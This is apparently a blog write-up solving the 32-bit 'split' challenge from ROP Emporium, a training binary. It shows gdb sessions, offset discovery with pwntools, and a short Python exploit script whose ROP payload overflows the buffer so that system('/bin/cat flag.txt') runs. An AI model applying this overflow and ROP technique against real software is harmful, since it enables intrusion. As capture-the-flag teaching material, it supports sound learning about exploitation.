---
layout: post
title: "ropemporium - split 32bit"
---

This is a writeup on the (32 bit) split challenge from ropemporium.

#  Description
_In this challenge the elements that allowed you to complete the ret2win challenge are still present, they've just been split apart. Find them and recombine them using a short ROP chain._

I started off with running the executable normally, to see what I was working with.
```
split by ROP Emporium
32bits

Contriving a reason to ask user for data...
> test input

Exiting
```
I started by creating a string pattern with `pwntools`:
```python
>>> from pwn import cyclic
>>> cyclic(40)
'aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaa'
>>>
```
```
$ echo -n aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaa > payload
$ gdb ./split32 -q
Reading symbols from ./split32...(no debugging symbols found)...done.
gdb-peda$ r < payload 
Starting program: /home/pwn/ropemporium/split/32/split32 < payload
split by ROP Emporium
32bits

Contriving a reason to ask user for data...
> 
Exiting

Program received signal SIGSEGV, Segmentation fault.

[----------------------------------registers-----------------------------------]
EAX: 0x0 
EBX: 0x0 
ECX: 0x80485e6 (<main+107>:	add    esp,0x10)
EDX: 0xf7f9a890 --> 0x0 
ESI: 0xf7f99000 --> 0x1d4d6c 
EDI: 0x0 
EBP: 0x804870e ("\nExiting")
ESP: 0x80485e6 (<main+107>:	add    esp,0x10)
EIP: 0xfffffe3a
EFLAGS: 0x10282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
Invalid $PC address: 0xfffffe3a
[------------------------------------stack-------------------------------------]
0000| 0x80485e6 (<main+107>:	add    esp,0x10)
0004| 0x80485ea (<main+111>:	add    BYTE PTR [eax],al)
0008| 0x80485ee (<main+115>:	mov    ecx,DWORD PTR [ebp-0x4])
0012| 0x80485f2 (<main+119>:	lea    esp,[ecx-0x4])
0016| 0x80485f6 (<pwnme>:	push   ebp)
0020| 0x80485fa (<pwnme+4>:	in     al,dx)
0024| 0x80485fe (<pwnme+8>:	add    al,0x6a)
0028| 0x8048602 (<pwnme+12>:	add    BYTE PTR [ebp-0x17af27bb],cl)
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0xfffffe3a in ?? ()
gdb-peda$ 
```
it wasn't very clear on what went wrong, so I tried a larger input with a size of 50.
upon running it segfaulted on a different address
```
Stopped reason: SIGSEGV
0x6161616c in ?? ()
```
Then I tried to find out the length of the padding that I would need to overflow successfully.
```python
>>> from pwn import fit
>>> fit({0x6161616c:'B'})
'aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaaB'
>>> len(_)
45
```
So the length was 44, because the `B` is where it starts overwriting the return address.
Now I just need the address of a command to execute and the address of a call to `system()`.
address of `system()`:
```
gdb-peda$ disassemble usefulFunction 
Dump of assembler code for function usefulFunction:
   0x08048649 <+0>:	push   ebp
   0x0804864a <+1>:	mov    ebp,esp
   0x0804864c <+3>:	sub    esp,0x8
   0x0804864f <+6>:	sub    esp,0xc
   0x08048652 <+9>:	push   0x8048747
   0x08048657 <+14>:	call   0x8048430 <system@plt>
   0x0804865c <+19>:	add    esp,0x10
   0x0804865f <+22>:	nop
   0x08048660 <+23>:	leave  
   0x08048661 <+24>:	ret    
End of assembler dump.
```
`0x8048430` is what I need to call.
the address of of "/bin/cat flag.txt":
```
gdb-peda$ info var
All defined variables:

Non-debugging symbols:
0x080486e8  _fp_hw
0x080486ec  _IO_stdin_used
0x08048750  __GNU_EH_FRAME_HDR
0x08048894  __FRAME_END__
0x08049f08  __frame_dummy_init_array_entry
0x08049f08  __init_array_start
0x08049f0c  __do_global_dtors_aux_fini_array_entry
0x08049f0c  __init_array_end
0x08049f10  __JCR_END__
0x08049f10  __JCR_LIST__
0x08049f14  _DYNAMIC
0x0804a000  _GLOBAL_OFFSET_TABLE_
0x0804a028  __data_start
0x0804a028  data_start
0x0804a02c  __dso_handle
0x0804a030  usefulString
0x0804a04a  __bss_start
0x0804a04a  _edata
0x0804a04c  __TMC_END__
0x0804a060  stderr
0x0804a060  stderr@@GLIBC_2.0
0x0804a080  stdin
0x0804a080  stdin@@GLIBC_2.0
0x0804a084  stdout
0x0804a084  stdout@@GLIBC_2.0
0x0804a088  completed
0x0804a08c  _end
gdb-peda$ x/s &usefulString 
0x804a030 <usefulString>:	"/bin/cat flag.txt"
gdb-peda$ 
```
so `0x804a030` was the address.
For my exploit, the stack frame should look like this:
```
+-------------------+
|    'A' times 44   |
+-------------------+
|    system addr    |
+-------------------+
| usefulString addr |
+-------------------+
```
So I came up with this exploit script:
```python
from pwn import *

bin_cat = p32(0x0804a030)
system_addr = p32(0x08048657)

payload = 'A'*44
payload += system_addr
payload += bin_cat
print payload
```
Upon running:
```
$ python exploit.py | ./split32
split by ROP Emporium
32bits

Contriving a reason to ask user for data...
> ROPE{a_placeholder_32byte_flag!}
Segmentation fault
$ 
```
Success!

link to challenge: [https://ropemporium.com/challenge/split.html](https://ropemporium.com/challenge/split.html)
